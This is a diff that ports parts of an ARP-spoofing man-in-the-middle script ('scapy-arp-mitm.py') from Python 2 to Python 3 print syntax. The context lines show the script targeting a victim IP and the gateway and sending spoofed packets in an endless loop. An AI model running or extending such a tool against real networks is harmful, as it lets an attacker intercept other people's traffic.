@@ -16,12 +16,12 @@ def get_default_gateway_ip(iface):
 	try:
 		return [x[2] for x in scapy.all.conf.route.routes if x[3] == iface and x[2] != '0.0.0.0'][0]
 	except IndexError:
-		print "Error: Network interface '%s' not found!" % interface
+		print("Error: Network interface '%s' not found!" % interface)
 		return False
 
 if len(sys.argv) < 2:
-	print "Usage: ./scapy-arp-mitm.py victim_ip [iface (default eth0)]"
-	print "Make sure you have packet forwarding enabled!"
+	print("Usage: ./scapy-arp-mitm.py victim_ip [iface (default eth0)]")
+	print("Make sure you have packet forwarding enabled!")
 	sys.exit(0)
 
 if len(sys.argv) < 3:
@@ -36,7 +36,7 @@ if not gateway:
 
 to_victim = create_packet(gateway, sys.argv[1], interface)
 to_gateway = create_packet(sys.argv[1], gateway, interface)
-print interface, gateway
+print(interface, gateway)
 
 while 1:
 	send(to_victim, verbose=0)
